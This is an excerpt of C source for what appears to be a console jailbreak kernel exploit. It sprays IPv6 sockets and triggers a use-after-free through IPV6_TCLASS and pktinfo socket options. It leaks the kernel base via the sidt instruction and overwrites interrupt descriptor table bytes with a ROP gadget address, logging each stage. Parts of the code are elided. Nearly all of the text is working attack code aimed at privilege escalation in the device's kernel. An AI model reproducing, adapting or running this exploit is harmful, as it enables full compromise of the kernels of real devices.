...
#define GET_TCLASS(name) int name(int sock) {                    \
    int v;                                                       \
    socklen_t optLen = sizeof(v);                                \
    if (getsockopt(sock, IPPROTO_IPV6, IPV6_TCLASS, &v, &optLen))\
        *(volatile int*)0;                                       \
    return v;                                                    \
}
...
void trigger_uaf(opaque* o) {
    ...
    nlprintf("uaf: %d", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
...
int main() {
    // Indicates that the console has already been jailbroken
    if (setuid(0) == 0) return 179;

    // Idk why but, create 16 new sockets
    for (int i = 0; i < 16; i++) {
        if (socket(AF_INET6, SOCK_DGRAM, 0) == -1) {
            nlprintf("socket() error: coulnt create socket %d", i);
            return 1;
        }
    }
    ...
    if (kevent_sock == -1) {
        nlprintf("socket() error: kevent_sock");
        return 1;
    }
    int master_sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (master_sock == -1) {
        nlprintf("socket() error: master_sock");
        return 1;
    }
    uint64_t idt_base, kernel_base;
    uint16_t idt_size;
    sidt(&idt_base, &idt_size);
    nlprintf("sidt = 0x%hx 0x%llx", idt_size, idt_base);

    krop_idt_base = idt_base;
    kernel_base = idt_base - 0x1bbb9e0;
    ...
    int spray_sock[512], q1 = 0, q2 = 0;
    for (int i = 0; i < 512; i++) {
        int retV = (spray_sock[i] = socket(AF_INET6, SOCK_DGRAM, 0));
        q1 += retV;
    }
    nlprintf("sockets=%d kqueues=%d", q1, q2);
    ...
    trigger_uaf(&o);
    nlprintf("UAF triggered successfully!");
    ...
    nlprintf("overlap_idx = %d", overlap_idx);
    if (overlap_idx < 0) {
        nlprintf("overlap_idx is less than 0");
        return 1;
    }
    ...
    char buf[20], buf2[20];
    nlprintf("get_pktinfo() = %d", get_pktinfo(master_sock, buf));
    nlprintf("idt before corruption: ");
    for (int i = 0; i < 20; i++) {
    ...
    *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
    ...
    nlprintf("idt after corruption: ");
    for (int i = 0; i < 20; i++) {
        printf("%02x ", (unsigned)buf2[i]);
    }
    nlprintf("set_pktinfo() = %d", set_pktinfo(master_sock, buf2));
    ...
    nlprintf("spray_map = 0x%llx", spray_map);
